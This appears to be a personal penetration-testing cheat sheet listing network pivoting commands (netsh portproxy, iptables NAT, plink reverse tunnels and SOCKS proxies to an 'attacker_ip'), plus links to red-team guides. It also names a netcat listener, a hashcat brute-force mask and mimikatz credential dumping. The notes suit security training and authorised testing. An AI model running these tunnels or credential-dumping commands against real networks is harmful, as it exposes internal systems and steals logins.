COMMANDS

Manual Port Forwarding
netsh interface portproxy add v4tov4 listenport=[local port] listenaddress=[local IP] connectport=[remote port] connectaddress=[remote IP]

iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.10.5:80     # redirect ::8080 -> 192.168.10.5:80
iptables -t nat -A POSTROUTING -d 192.168.10.0/24 -j MASQUERADE                                # change source ip of packets going to 192.168.10.0/24 to current machine's

cmd.exe /c echo y | plink.exe -ssh -l [attacker_username] -pw [attacker_ssh_password]          # reverse port forwarding, attacker_ip listens on attacker_port, forwards to victim_ip:victim_port
-R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]

plink.exe -R 8080:serverB:80 attacker_ip                                                       # reverse port forwarding w/o ssh, exposes serverB at attacker_ip:8080


SOCKS Proxies
msfconsole auxiliary/server/socks_proxy

plink -D 1080 user@A -N                                # Set up SOCKS proxy connected to previous direct hop
PLINK.EXE 192.168.1.2 -P 22 -D 127.0.0.1:1080 -N       # Sets up SOCKS proxy connected to 192.168.1.2:22 



SOURCES

RECON
https://github.com/ibr0wse/RedTeam-PenTest-Cheatsheet-Checklist


PIVOTING RESOURCES
cheatsheet 1: https://github.com/twelvesec/port-forwarding
cheatsheet 2: https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/

explanation of SOCKS proxy: https://chatgpt.com/share/68c53b1e-2694-8006-aaae-0703c4e6f300

SOCKS vs manual port forwarding: https://chatgpt.com/share/68c57ed5-19e4-8006-8947-33b2331c3ad9 

plink SOCKS: https://gist.github.com/moshekaplan/425c2a263c3e8a0b080d

double pivot ssh/SOCKS tutorial: https://youtu.be/Ik7ubJTILUw?si=I9NdtvI87vvCJ6m3


PREROUTING/POSTROUTING
https://chatgpt.com/share/68c518d7-a740-8006-a147-0266bd7d9059


PRIVESC
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/


NOTABLE TOOLS
nc -nvlp 
hashcat -m 0 -a 3 -1 ?l?d ?1?1?1?1?1
smbclient
ldifde
kiwi (dump lsa secrets)
mimikatz - privilege::debug, sekurlsa::logonpasswords
